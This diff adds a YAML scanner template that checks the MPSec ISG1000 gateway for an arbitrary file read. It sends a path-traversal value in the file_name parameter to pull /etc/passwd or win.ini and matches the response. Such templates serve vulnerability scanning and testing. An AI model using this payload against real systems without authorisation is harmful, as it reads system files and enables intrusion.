@@ -1,0 +1,22 @@
+id: poc-yaml-mpsec-isg1000-arbitrary-file-read
+info:
+  name: MPSec ISG1000 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: MPSec
+  osprey-id: vb_2021_0044
+variables:
+  v_path: '../../../../../../../../../../../../etc/passwd
+
+    ../../../../../../../../../../../../c:/windows/win.ini'
+requests:
+- method: GET
+  path: /webui/?g=sys_dia_data_down&file_name={{.v_path}}
+  headers:
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:86.0) Gecko/20100101
+      Firefox/86.0
+    Content-Type: application/x-www-form-urlencoded
+  expression: "(\n  contains(body, \"root:\") && contains(body, \"/bin\") ||\n  contains(body,\
+    \ \"; for 16-bit app support\")\n) && !contains(body, \"<\")\n"
+transport: http
